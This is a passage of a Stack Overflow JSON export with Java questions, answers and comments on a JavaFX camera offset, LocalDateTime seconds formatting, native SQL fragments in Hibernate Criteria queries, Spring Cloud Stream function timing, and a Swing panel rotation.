5);\r\n\t\trectangle.translateXProperty().bind(player.posXPorperty().divide(10));\r\n\t\trectangle.translateYProperty().bind(player.posYPorperty().divide(10));\r\n\t\trectangle.setFill(Color.RED);\r\n\t\tmap.getChildren().add(rectangle);\r\n\r\n\t\tsubscene.setCamera(player.getPespectiveCamera());\r\n\t\tscene.addEventHandler(KeyEvent.KEY_PRESSED, player.getKeyHandle());\r\n\t\tscene.addEventHandler(MouseEvent.MOUSE_MOVED, player.getMouseHandle());\r\n\t\tscene.setFill(Color.BLACK);\r\n\r\n\t\tCursor cursor = Cursor.CROSSHAIR;\r\n\t\tscene.setCursor(cursor);\r\n\r\n\t\tstage.addEventHandler(KeyEvent.KEY_RELEASED, e -&gt; {\r\n\t\t\tif (e.getCode() != KeyCode.F11) {\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tif (stage.isFullScreen()) {\r\n\t\t\t\tstage.setFullScreen(false);\r\n\t\t\t} else {\r\n\t\t\t\tstage.setFullScreen(true);\r\n\t\t\t}\r\n\t\t});\r\n\r\n\t\tstage.setAlwaysOnTop(true);\r\n\t\tstage.setScene(scene);\r\n\t\tstage.show();\r\n\t}\r\n\r\n\tprivate class ContentScene extends SubScene {\r\n\r\n\t\tpublic ContentScene(Group content, Group map, double width, double height) {\r\n\t\t\tsuper(content, width, height, true, SceneAntialiasing.BALANCED);\r\n\r\n\t\t\tPhongMaterial material = new PhongMaterial(Color.AQUA);\r\n\r\n\t\t\tfor (int v = 0; v &lt; 3_600; v += 180) {\r\n\t\t\t\tfor (int y = 0; y &lt; 500; y += 100) {\r\n\t\t\t\t\tBox box = new Box(50, 50, 50);\r\n\t\t\t\t\tbox.setTranslateX(Math.sin(v / 10) * 1_000);\r\n\t\t\t\t\tbox.setTranslateY(y);\r\n\t\t\t\t\tbox.setTranslateZ(Math.cos(v / 10) * 1_000);\r\n\t\t\t\t\tbox.setMaterial(material);\r\n\t\t\t\t\tcontent.getChildren().add(box);\r\n\r\n\t\t\t\t\tRectangle rectangle = new Rectangle(5, 5);\r\n\t\t\t\t\trectangle.translateXProperty().bind(box.translateXProperty().divide(10));\r\n\t\t\t\t\trectangle.translateYProperty().bind(box.translateZProperty().divide(10));\r\n\t\t\t\t\trectangle.setFill(Color.AQUA);\r\n\t\t\t\t\tmap.getChildren().add(rectangle);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n```\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/m4anX.png","title":"First Person Camera is not on the correct position","body":"<p>I am trying to create a first person camera in JavaFX based on bindings. The camera and the actual position both work perfectly. The only problem is that they don’t match! As you can see in the picture, the actual position (red box) is in the middle of the circle, but the camera is outside. How can I change that? What did I do wrong?\n<a href=\"https://i.stack.imgur.com/m4anX.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/m4anX.png\" alt=\"enter image description here\" /></a></p>\n<p>The Player class handles the PerspectiveCamera.</p>\n<pre><code>package game;\n\nimport javafx.application.Platform;\nimport javafx.beans.property.DoubleProperty;\nimport javafx.beans.property.SimpleDoubleProperty;\nimport javafx.event.EventHandler;\nimport javafx.scene.PerspectiveCamera;\nimport javafx.scene.input.KeyEvent;\nimport javafx.scene.input.MouseEvent;\nimport javafx.scene.robot.Robot;\nimport javafx.scene.transform.Rotate;\nimport javafx.scene.transform.Translate;\nimport javafx.stage.Stage;\n\npublic class Player extends Character {\n\n    private static final Robot ROBOT = new Robot();\n    private DoubleProperty relativeCenterX = new SimpleDoubleProperty();\n    private DoubleProperty relativeCenterY = new SimpleDoubleProperty();\n\n    protected PerspectiveCamera camera = new PerspectiveCamera();\n    protected Rotate xAxis = new Rotate(0, 250, 0, 0, Rotate.Y_AXIS);\n    protected Rotate yAxis = new Rotate(0, 0, 250, 0, Rotate.X_AXIS);\n    protected Translate translate = new Translate();\n\n    protected DoubleProperty centerX = new SimpleDoubleProperty();\n    protected DoubleProperty centerY = new SimpleDoubleProperty();\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public Player(Stage stage) {\n        camera.getTransforms().addAll(xAxis, yAxis);\n\n        centerX.bind(stage.widthProperty().divide(2));\n        centerY.bind(stage.heightProperty().divide(2));\n\n        relativeCenterX.bind(stage.xProperty().add(centerX));\n        relativeCenterY.bind(stage.yProperty().add(centerY));\n\n        camera.translateXProperty().bind(posX.subtract(centerX));\n        camera.translateYProperty().bind(posZ);\n        camera.translateZProperty().bind(posY.subtract(centerY));\n\n        xAxis.angleProperty().bind(viewX.subtract(90));\n        yAxis.angleProperty().bind(viewY);\n\n        translate.xProperty().bind(posX);\n        translate.zProperty().bind(posY);\n        translate.yProperty().bind(posZ);\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public EventHandler&lt;KeyEvent&gt; getKeyHandle() {\n        return e -&gt; {\n            switch (e.getCode()) {\n            case A:\n                view(-1, 0);\n                break;\n            case D:\n                view(1, 0);\n                break;\n            case W:\n                move(1, 1, 0);\n                break;\n            case S:\n                move(-1, -1, 0);\n                break;\n            case SPACE:\n                move(0, 0, 10);\n                break;\n            case F:\n                move(0, 0, -10);\n                break;\n            default:\n                break;\n            }\n        };\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public EventHandler&lt;MouseEvent&gt; getMouseHandle() {\n        return e -&gt; {\n            view(e.getSceneX() - centerX.doubleValue(), centerY.doubleValue() - e.getSceneY());\n            Platform.runLater(() -&gt; {\n                ROBOT.mouseMove(relativeCenterX.intValue(), relativeCenterY.intValue());\n            });\n        };\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public PerspectiveCamera getPespectiveCamera() {\n        return camera;\n    }\n}\n\n</code></pre>\n<p>The Character class calculates position and view.</p>\n<pre><code>package game;\n\nimport javafx.beans.property.DoubleProperty;\nimport javafx.beans.property.SimpleDoubleProperty;\n\npublic abstract class Character {\n\n    protected DoubleProperty posX = new SimpleDoubleProperty();\n    protected DoubleProperty posY = new SimpleDoubleProperty();\n    protected DoubleProperty posZ = new SimpleDoubleProperty();\n\n    protected DoubleProperty viewX = new SimpleDoubleProperty();\n    protected DoubleProperty viewY = new SimpleDoubleProperty();\n\n    protected DoubleProperty speed = new SimpleDoubleProperty(10);\n\n    public void move(double x, double y, double z) {\n\n        double fX = Math.cos(Math.toRadians(viewX.get()));\n        double fY = -Math.sin(Math.toRadians(viewX.get()));\n        double fZ = 1;\n\n        posX.set(posX.get() + fX * x * speed.get());\n        posY.set(posY.get() + fY * y * speed.get());\n        posZ.set(posZ.get() + fZ * z);\n    }\n\n    public void view(double x, double y) {\n        viewX.set(viewX.get() + x);\n        viewY.set(viewY.get() + y);\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty posXPorperty() {\n        return posX;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty posYPorperty() {\n        return posY;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty posZPorperty() {\n        return posZ;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty viewXPorperty() {\n        return viewX;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty viewYPorperty() {\n        return viewY;\n    }\n}\n</code></pre>\n<p>My Application, which shows the total graphical content.</p>\n<pre><code>package graphics;\n\nimport game.Player;\nimport javafx.application.Application;\nimport javafx.scene.Cursor;\nimport javafx.scene.Group;\nimport javafx.scene.Scene;\nimport javafx.scene.SceneAntialiasing;\nimport javafx.scene.SubScene;\nimport javafx.scene.input.KeyCode;\nimport javafx.scene.input.KeyEvent;\nimport javafx.scene.input.MouseEvent;\nimport javafx.scene.layout.BorderPane;\nimport javafx.scene.paint.Color;\nimport javafx.scene.paint.PhongMaterial;\nimport javafx.scene.shape.Box;\nimport javafx.scene.shape.Rectangle;\nimport javafx.stage.Stage;\n\npublic class GameStage extends Application implements Runnable {\n\n    @Override\n    public void run() {\n        launch();\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    @Override\n    public void start(Stage stage) throws Exception {\n\n        BorderPane pane = new BorderPane();\n        Scene scene = new Scene(pane, 500, 500);\n\n        Group content = new Group(), map = new Group();\n        ContentScene subscene = new ContentScene(content, map, 500, 500);\n        subscene.widthProperty().bind(scene.widthProperty());\n        subscene.heightProperty().bind(scene.heightProperty());\n        pane.getChildren().add(subscene);\n        pane.setBottom(map);\n\n        Player player = new Player(stage);\n        Box box = new Box(50, 50, 50);\n        box.translateXProperty().bind(player.posXPorperty());\n        box.translateYProperty().bind(player.posZPorperty());\n        box.translateZProperty().bind(player.posYPorperty());\n        box.rotateProperty().bind(player.viewXPorperty());\n        box.setMaterial(new PhongMaterial(Color.RED));\n        content.getChildren().add(box);\n\n        Rectangle rectangle = new Rectangle(5, 5);\n        rectangle.translateXProperty().bind(player.posXPorperty().divide(10));\n        rectangle.translateYProperty().bind(player.posYPorperty().divide(10));\n        rectangle.setFill(Color.RED);\n        map.getChildren().add(rectangle);\n\n        subscene.setCamera(player.getPespectiveCamera());\n        scene.addEventHandler(KeyEvent.KEY_PRESSED, player.getKeyHandle());\n        scene.addEventHandler(MouseEvent.MOUSE_MOVED, player.getMouseHandle());\n        scene.setFill(Color.BLACK);\n\n        Cursor cursor = Cursor.CROSSHAIR;\n        scene.setCursor(cursor);\n\n        stage.addEventHandler(KeyEvent.KEY_RELEASED, e -&gt; {\n            if (e.getCode() != KeyCode.F11) {\n                return;\n            }\n            if (stage.isFullScreen()) {\n                stage.setFullScreen(false);\n            } else {\n                stage.setFullScreen(true);\n            }\n        });\n\n        stage.setAlwaysOnTop(true);\n        stage.setScene(scene);\n        stage.show();\n    }\n\n    private class ContentScene extends SubScene {\n\n        public ContentScene(Group content, Group map, double width, double height) {\n            super(content, width, height, true, SceneAntialiasing.BALANCED);\n\n            PhongMaterial material = new PhongMaterial(Color.AQUA);\n\n            for (int v = 0; v &lt; 3_600; v += 180) {\n                for (int y = 0; y &lt; 500; y += 100) {\n                    Box box = new Box(50, 50, 50);\n                    box.setTranslateX(Math.sin(v / 10) * 1_000);\n                    box.setTranslateY(y);\n                    box.setTranslateZ(Math.cos(v / 10) * 1_000);\n                    box.setMaterial(material);\n                    content.getChildren().add(box);\n\n                    Rectangle rectangle = new Rectangle(5, 5);\n                    rectangle.translateXProperty().bind(box.translateXProperty().divide(10));\n                    rectangle.translateYProperty().bind(box.translateZProperty().divide(10));\n                    rectangle.setFill(Color.AQUA);\n                    map.getChildren().add(rectangle);\n                }\n            }\n        }\n    }\n}\n\n</code></pre>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642496811,"post_id":70752830,"comment_id":125079600,"body_markdown":"Note that you&#39;e only _parsing_ the string to `LocalDateTime` but you don&#39;t define any _format_ for a conversion back to a string (nor did you share how you&#39;re doing that). I assume the output you get results from calling `toString()` on the `LocalDateTime` you&#39;re returning.","body":"Note that you&#39;e only <i>parsing</i> the string to <code>LocalDateTime</code> but you don&#39;t define any <i>format</i> for a conversion back to a string (nor did you share how you&#39;re doing that). I assume the output you get results from calling <code>toString()</code> on the <code>LocalDateTime</code> you&#39;re returning."},{"owner":{"account_id":5708598,"reputation":8967,"user_id":4511325,"accept_rate":66,"display_name":"None"},"score":0,"creation_date":1642496921,"post_id":70752830,"comment_id":125079640,"body_markdown":"im returning LocalDateTime, this method is all what im doing... and i just pass this String date &quot;14.01.2022&quot;. I need something else to add?","body":"im returning LocalDateTime, this method is all what im doing... and i just pass this String date &quot;14.01.2022&quot;. I need something else to add?"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":1,"creation_date":1642496930,"post_id":70752830,"comment_id":125079642,"body_markdown":"Btw, the name `setActivationDate(...)` seems to be very misleading since it doesn&#39;t set anything, looks like a setter but is a static utility method. I&#39;d rename it to something more sensible in order to avoid confusion if you or someone else needs to read that code in the future (think of yourself trying to remember wtf this method is doing 6 months from now).","body":"Btw, the name <code>setActivationDate(...)</code> seems to be very misleading since it doesn&#39;t set anything, looks like a setter but is a static utility method. I&#39;d rename it to something more sensible in order to avoid confusion if you or someone else needs to read that code in the future (think of yourself trying to remember wtf this method is doing 6 months from now)."},{"owner":{"account_id":5708598,"reputation":8967,"user_id":4511325,"accept_rate":66,"display_name":"None"},"score":0,"creation_date":1642497013,"post_id":70752830,"comment_id":125079676,"body_markdown":"ok, tnx..i will rename it :) but right now bigger problem is that i can not get seconds in this conversion :/","body":"ok, tnx..i will rename it :) but right now bigger problem is that i can not get seconds in this conversion :/"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":1,"creation_date":1642497099,"post_id":70752830,"comment_id":125079715,"body_markdown":"&quot;I need something else to add?&quot; - In that method you probably don&#39;t have to add anything. This method basically takes a date and creates a `LocalDateTime` using that date string and time 00:00:00. So you get a valid `LocalDateTime` _object_ that you can work with and that has even higher precision than just seconds. If you want to output that time you need another `DateTimeFormatter` to format the object back to a string. What you didn&#39;t show is how you&#39;re producing the output - I _guess_ you&#39;re doing just a `System.out.println(...)`, aren&#39;t you?","body":"&quot;I need something else to add?&quot; - In that method you probably don&#39;t have to add anything. This method basically takes a date and creates a <code>LocalDateTime</code> using that date string and time 00:00:00. So you get a valid <code>LocalDateTime</code> <i>object</i> that you can work with and that has even higher precision than just seconds. If you want to output that time you need another <code>DateTimeFormatter</code> to format the object back to a string. What you didn&#39;t show is how you&#39;re producing the output - I <i>guess</i> you&#39;re doing just a <code>System.out.println(...)</code>, aren&#39;t you?"},{"owner":{"account_id":5708598,"reputation":8967,"user_id":4511325,"accept_rate":66,"display_name":"None"},"score":0,"creation_date":1642497922,"post_id":70752830,"comment_id":125080015,"body_markdown":"yes, only that and there i see that output result","body":"yes, only that and there i see that output result"}],"answers":[{"tags":[],"owner":{"account_id":10814530,"reputation":4195,"user_id":7954021,"display_name":"Renis1235"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642497455,"creation_date":1642497135,"answer_id":70752973,"question_id":70752830,"body_markdown":"`LocalDateTime` omits the seconds when they are `00`.\r\nIf you want to get them use the `ISO_LOCAL_DATE_TIME` formatter:\r\n\r\n```java\r\nString date = &quot;14.01.2022&quot;;\r\nDateTimeFormatter dateFormatter = DateTimeFormatter.ofPattern(&quot;dd.MM.yyy&quot;);\r\nLocalDate ld = LocalDate.parse(date, dateFormatter);\r\n\r\nLocalDateTime ldt = LocalDateTime.of(ld, LocalTime.MIDNIGHT);\r\n\r\nSystem.out.println(ldt.format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));\r\n```\r\n\r\nPrints\r\n\r\n```\r\n2022-01-14T00:00:00\r\n```\r\n\r\nIf you take a look at the [docs][1], `toString` explains the behaviour: \r\n\r\n&gt; Outputs this date-time as a String, such as 2007-12-03T10:15:30.\r\nThe output will be one of the following ISO-8601 formats:\r\n&gt;\r\n&gt; uuuu-MM-dd&#39;T&#39;HH:mm\r\n&gt;\r\n&gt; uuuu-MM-dd&#39;T&#39;HH:mm:ss\r\n&gt;\r\n&gt; uuuu-MM-dd&#39;T&#39;HH:mm:ss.SSS\r\n&gt;\r\n&gt; uuuu-MM-dd&#39;T&#39;HH:mm:ss.SSSSSS\r\n&gt;\r\n&gt; uuuu-MM-dd&#39;T&#39;HH:mm:ss.SSSSSSSSS\r\n&gt;\r\n&gt; The format used will be the shortest that outputs the full value of the time where the omitted parts are **implied to be zero**.\r\n\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/8/docs/api/java/time/LocalDateTime.html#toString--","title":"Convert specific format from string to LocalDateTime","body":"<p><code>LocalDateTime</code> omits the seconds when they are <code>00</code>.\nIf you want to get them use the <code>ISO_LOCAL_DATE_TIME</code> formatter:</p>\n<pre class=\"lang-java prettyprint-override\"><code>String date = &quot;14.01.2022&quot;;\nDateTimeFormatter dateFormatter = DateTimeFormatter.ofPattern(&quot;dd.MM.yyy&quot;);\nLocalDate ld = LocalDate.parse(date, dateFormatter);\n\nLocalDateTime ldt = LocalDateTime.of(ld, LocalTime.MIDNIGHT);\n\nSystem.out.println(ldt.format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));\n</code></pre>\n<p>Prints</p>\n<pre><code>2022-01-14T00:00:00\n</code></pre>\n<p>If you take a look at the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/LocalDateTime.html#toString--\" rel=\"nofollow noreferrer\">docs</a>, <code>toString</code> explains the behaviour:</p>\n<blockquote>\n<p>Outputs this date-time as a String, such as 2007-12-03T10:15:30.\nThe output will be one of the following ISO-8601 formats:</p>\n<p>uuuu-MM-dd'T'HH:mm</p>\n<p>uuuu-MM-dd'T'HH:mm:ss</p>\n<p>uuuu-MM-dd'T'HH:mm:ss.SSS</p>\n<p>uuuu-MM-dd'T'HH:mm:ss.SSSSSS</p>\n<p>uuuu-MM-dd'T'HH:mm:ss.SSSSSSSSS</p>\n<p>The format used will be the shortest that outputs the full value of the time where the omitted parts are <strong>implied to be zero</strong>.</p>\n</blockquote>\n"}],"owner":{"account_id":5708598,"reputation":8967,"user_id":4511325,"accept_rate":66,"display_name":"None"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":63,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70752973,"answer_count":1,"score":0,"last_activity_date":1642497603,"creation_date":1642496479,"question_id":70752830,"body_markdown":"I have this method:\r\n\r\n       private static LocalDateTime setActivationDate(final String date) {\r\n            DateTimeFormatter dateFormatter = DateTimeFormatter.ofPattern(&quot;dd.MM.yyy&quot;);\r\n            LocalDate ld = LocalDate.parse(date, dateFormatter);\r\n            return LocalDateTime.of(ld, LocalDateTime.MIN.toLocalTime());\r\n        }\r\n\r\nWhen i pass value `dd.MM.yyyy` for example: `14.01.2022` i get this:\r\n\r\n    2022-01-14T00:00\r\n\r\nBut I want to return and seconds also..so that format looks like this:\r\n\r\n    2022-01-14T00:00:00\r\n\r\nAny suggestion?","title":"Convert specific format from string to LocalDateTime","body":"<p>I have this method:</p>\n<pre><code>   private static LocalDateTime setActivationDate(final String date) {\n        DateTimeFormatter dateFormatter = DateTimeFormatter.ofPattern(&quot;dd.MM.yyy&quot;);\n        LocalDate ld = LocalDate.parse(date, dateFormatter);\n        return LocalDateTime.of(ld, LocalDateTime.MIN.toLocalTime());\n    }\n</code></pre>\n<p>When i pass value <code>dd.MM.yyyy</code> for example: <code>14.01.2022</code> i get this:</p>\n<pre><code>2022-01-14T00:00\n</code></pre>\n<p>But I want to return and seconds also..so that format looks like this:</p>\n<pre><code>2022-01-14T00:00:00\n</code></pre>\n<p>Any suggestion?</p>\n"},{"tags":["java","sql","hibernate","jpa","criteria-api"],"comments":[{"owner":{"account_id":160350,"reputation":11421,"user_id":380338,"display_name":"Neil Stockton"},"score":0,"creation_date":1428928436,"post_id":29604734,"comment_id":47356394,"body_markdown":"No, you cannot use SQL with JPA Criteria - JPA Criteria is for writing JPQL. If some implementation &quot;offers&quot; it as an extension then you lose portability. As per the JPA spec","body":"No, you cannot use SQL with JPA Criteria - JPA Criteria is for writing JPQL. If some implementation &quot;offers&quot; it as an extension then you lose portability. As per the JPA spec"}],"answers":[{"tags":[],"owner":{"account_id":2385304,"reputation":7157,"user_id":2086401,"accept_rate":95,"display_name":"StuPointerException"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1428939604,"creation_date":1428927234,"answer_id":29605044,"question_id":29604734,"body_markdown":"Yes, you can get the SQL from the Hibernate criteria using the `org.hibernate.loader.criteria.CriteriaQueryTranslator` class.  \r\n\r\nThis will allow you to append the additional SQL clause(s) to the end and execute it as a native SQL:\r\n\r\n    CriteriaQueryTranslator translator = new CriteriaQueryTranslator(factory, criteria, &quot;myEntityName&quot;, CriteriaQueryTranslator.ROOT_SQL_ALIAS);\r\n    String select = translator.getSelect();    \r\n    String whereClause = translator.getWhereCondition();\r\n\r\nPersonally though, if faced with this requirement I would shy away from accepting SQL from the end-user and give them a user interface to populate some type of filter object.  This can then be converted into HQL criterion, which is much safer and doesn&#39;t tie your code as tightly to the database implementation.\r\n\r\n**Edit based on comments**\r\n\r\nExample of extracting SQL from a JPA query implemented with Hibernate:\r\n\r\n    CriteriaBuilder builder = entityManager.getCriteriaBuilder();\r\n    CriteriaQuery&lt;MyEntity&gt; q = builder.createQuery(MyEntity.class);\r\n    Root&lt;MyEntity&gt; entity = q.from(MyEntity.class);\r\n    q.select(entity).orderBy(builder.desc(entity.get(&quot;lastModified&quot;)));\r\n    TypedQuery&lt;MyEntity&gt; query = entityManager.createQuery(q);\r\n\r\n    String sql = query.unwrap(org.hibernate.Query.class).getQueryString();","title":"How to use native SQL as a fragment (where clause) of a bigger query made with Criteria API in Hibernate?","body":"<p>Yes, you can get the SQL from the Hibernate criteria using the <code>org.hibernate.loader.criteria.CriteriaQueryTranslator</code> class.  </p>\n\n<p>This will allow you to append the additional SQL clause(s) to the end and execute it as a native SQL:</p>\n\n<pre><code>CriteriaQueryTranslator translator = new CriteriaQueryTranslator(factory, criteria, \"myEntityName\", CriteriaQueryTranslator.ROOT_SQL_ALIAS);\nString select = translator.getSelect();    \nString whereClause = translator.getWhereCondition();\n</code></pre>\n\n<p>Personally though, if faced with this requirement I would shy away from accepting SQL from the end-user and give them a user interface to populate some type of filter object.  This can then be converted into HQL criterion, which is much safer and doesn't tie your code as tightly to the database implementation.</p>\n\n<p><strong>Edit based on comments</strong></p>\n\n<p>Example of extracting SQL from a JPA query implemented with Hibernate:</p>\n\n<pre><code>CriteriaBuilder builder = entityManager.getCriteriaBuilder();\nCriteriaQuery&lt;MyEntity&gt; q = builder.createQuery(MyEntity.class);\nRoot&lt;MyEntity&gt; entity = q.from(MyEntity.class);\nq.select(entity).orderBy(builder.desc(entity.get(\"lastModified\")));\nTypedQuery&lt;MyEntity&gt; query = entityManager.createQuery(q);\n\nString sql = query.unwrap(org.hibernate.Query.class).getQueryString();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1551684,"reputation":1024,"user_id":1443928,"accept_rate":93,"display_name":"Hard Worker"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1642497602,"creation_date":1642497602,"answer_id":70753079,"question_id":29604734,"body_markdown":"\r\n\r\n\r\ncriteria.add(Restrictions.sqlRestriction(&quot; AND ID in (1,2,3)&quot; ));","title":"How to use native SQL as a fragment (where clause) of a bigger query made with Criteria API in Hibernate?","body":"<p>criteria.add(Restrictions.sqlRestriction(&quot; AND ID in (1,2,3)&quot; ));</p>\n"}],"owner":{"account_id":6132669,"reputation":111,"user_id":4782400,"display_name":"MichalD"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":8952,"favorite_count":0,"down_vote_count":0,"up_vote_count":11,"answer_count":2,"score":11,"last_activity_date":1642497602,"creation_date":1428926241,"question_id":29604734,"body_markdown":"I have a following problem. In application, which I am developing, we use Hibernate and every query is written with Criteria API. Now, in some places, we want to add possibility for user to write some SQL code which will be used as part of where clause in a query. So basically, user can filter data displayed to him from database in his own way.\r\n\r\nFor a few days now, I am trying to find a way to modify our previous queries to acquire result described above. Here is what I know:\r\n\r\n 1. It looks like you cannot combine Criteria API with native SQL. You can either write whole query in SQL or use only criteria API. Is that right?\r\nI am asking this question because it would be the easiest solution, just to use this SQL code as another predicate in where clause in our query. But I don&#39;t think it&#39;s possbile on this level.\r\n\r\n 2. I know on which table user wants to filter data. So I could just execute native SQL query and use result list as a parameter to IN clause in criteria query. But I don&#39;t know if it is efficient with many records in a result list.\r\n\r\n 3. So if I cannot do it on criteria API level, I thought that maybe I could  somehow influence the SQL generetion process and put my SQL in a proper place but it seems to be impossible.\r\n\r\n 4. So my real question is: **is it somehow possible to have access to SQL code of the query, after SQL generation phase but before actual execution of query?** Just to manipulate with it manually? Can it be done safely and as far as possible simply?\r\n\r\n 5. Or maybe just try to parse this SQL written by user and use it in criteria query?\r\n\r\nChanging existing criteria queries into native SQL queries is rather out of discussion.","title":"How to use native SQL as a fragment (where clause) of a bigger query made with Criteria API in Hibernate?","body":"<p>I have a following problem. In application, which I am developing, we use Hibernate and every query is written with Criteria API. Now, in some places, we want to add possibility for user to write some SQL code which will be used as part of where clause in a query. So basically, user can filter data displayed to him from database in his own way.</p>\n\n<p>For a few days now, I am trying to find a way to modify our previous queries to acquire result described above. Here is what I know:</p>\n\n<ol>\n<li><p>It looks like you cannot combine Criteria API with native SQL. You can either write whole query in SQL or use only criteria API. Is that right?\nI am asking this question because it would be the easiest solution, just to use this SQL code as another predicate in where clause in our query. But I don't think it's possbile on this level.</p></li>\n<li><p>I know on which table user wants to filter data. So I could just execute native SQL query and use result list as a parameter to IN clause in criteria query. But I don't know if it is efficient with many records in a result list.</p></li>\n<li><p>So if I cannot do it on criteria API level, I thought that maybe I could  somehow influence the SQL generetion process and put my SQL in a proper place but it seems to be impossible.</p></li>\n<li><p>So my real question is: <strong>is it somehow possible to have access to SQL code of the query, after SQL generation phase but before actual execution of query?</strong> Just to manipulate with it manually? Can it be done safely and as far as possible simply?</p></li>\n<li><p>Or maybe just try to parse this SQL written by user and use it in criteria query?</p></li>\n</ol>\n\n<p>Changing existing criteria queries into native SQL queries is rather out of discussion.</p>\n"},{"tags":["java","spring-cloud-stream","spring-cloud-function"],"comments":[{"owner":{"account_id":290683,"reputation":12512,"user_id":592355,"display_name":"xerx593"},"score":1,"creation_date":1642497899,"post_id":70753020,"comment_id":125080007,"body_markdown":"Hi &amp; Welcome! [Spring-cloud-sleuth](https://docs.spring.io/spring-cloud-sleuth/docs/current/reference/html/getting-started.html#getting-started) sounds like matching your needs: &quot;Spring Cloud Sleuth provides API for distributed tracing solution for Spring Cloud.&quot; ...&quot;Span: The basic unit of work. ...Spans can be started and stopped, and they keep track of their timing information. Once you create a span, you must stop it at some point in the future.&quot;","body":"Hi &amp; Welcome! <a href=\"https://docs.spring.io/spring-cloud-sleuth/docs/current/reference/html/getting-started.html#getting-started\" rel=\"nofollow noreferrer\">Spring-cloud-sleuth</a> sounds like matching your needs: &quot;Spring Cloud Sleuth provides API for distributed tracing solution for Spring Cloud.&quot; ...&quot;Span: The basic unit of work. ...Spans can be started and stopped, and they keep track of their timing information. Once you create a span, you must stop it at some point in the future.&quot;"},{"owner":{"account_id":23974508,"reputation":1,"user_id":17962775,"display_name":"greenstreetmatt"},"score":0,"creation_date":1643108165,"post_id":70753020,"comment_id":125246736,"body_markdown":"I tested this, it will give you the time for f1|f2|f3 but not the individual functions.\nI managed to get it to log time taken using Aop @Around(&quot;bean(f1)&quot;) however, it involved knowing the names of the beans","body":"I tested this, it will give you the time for f1|f2|f3 but not the individual functions. I managed to get it to log time taken using Aop @Around(&quot;bean(f1)&quot;) however, it involved knowing the names of the beans"}],"owner":{"account_id":23974508,"reputation":1,"user_id":17962775,"display_name":"greenstreetmatt"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":70,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642497354,"creation_date":1642497354,"question_id":70753020,"body_markdown":"I have a spring cloud stream app chaining together some functions.  I need a nice way to log time taken for each function without having to wrap the logic for each in log and timing statements.  I can do it if I write the function as an anonymous inner class and annotate the apply method but its a bit ugly\r\n\r\nspring: \r\n  cloud: \r\n    function:\r\n      definition: f1|f2|f3\r\n\r\n    @Bean\r\n    public Function&lt;Message&lt;String&gt;, Message&lt;String&gt;&gt; f1(){\r\n      return f -&gt; {\r\n            do stuff\r\n             return f;\r\n        };\r\n     }\r\n\r\n    public Function&lt;Message&lt;String&gt;, Message&lt;String&gt;&gt; f1(){\r\n      return new Function&lt;Message&lt;String&gt;, Message&lt;String&gt;&gt;(){\r\n        @LogTiming(name = f1)\r\n        public Message&lt;String&gt; apply(Message&lt;String&gt; msg){  \r\n\r\n     }\r\n\r\nAny tips/examples would be great","title":"How to capture timings for spring cloud stream composite functions","body":"<p>I have a spring cloud stream app chaining together some functions.  I need a nice way to log time taken for each function without having to wrap the logic for each in log and timing statements.  I can do it if I write the function as an anonymous inner class and annotate the apply method but its a bit ugly</p>\n<p>spring:\ncloud:\nfunction:\ndefinition: f1|f2|f3</p>\n<pre><code>@Bean\npublic Function&lt;Message&lt;String&gt;, Message&lt;String&gt;&gt; f1(){\n  return f -&gt; {\n        do stuff\n         return f;\n    };\n }\n\npublic Function&lt;Message&lt;String&gt;, Message&lt;String&gt;&gt; f1(){\n  return new Function&lt;Message&lt;String&gt;, Message&lt;String&gt;&gt;(){\n    @LogTiming(name = f1)\n    public Message&lt;String&gt; apply(Message&lt;String&gt; msg){  \n\n }\n</code></pre>\n<p>Any tips/examples would be great</p>\n"},{"tags":["java","swing","jpanel"],"comments":[{"owner":{"account_id":969721,"reputation":344518,"user_id":992484,"accept_rate":60,"display_name":"MadProgrammer"},"score":0,"creation_date":1641775213,"post_id":70646590,"comment_id":124887685,"body_markdown":"The original size of the window is 800x500, but you rotate the context 90 degrees, so now the size is going to be (more like) 500x800. So the general answer is, no, not really a &quot;simple&quot; solution.  One solution might be to make the panel&#39;s size square, by overriding `getPreferredSize`","body":"The original size of the window is 800x500, but you rotate the context 90 degrees, so now the size is going to be (more like) 500x800. So the general answer is, no, not really a &quot;simple&quot; solution.  One solution might be to make the panel&#39;s size square, by overriding <code>getPreferredSize</code>"},{"owner":{"account_id":19962129,"reputation":379,"user_id":14629458,"display_name":"Yasser 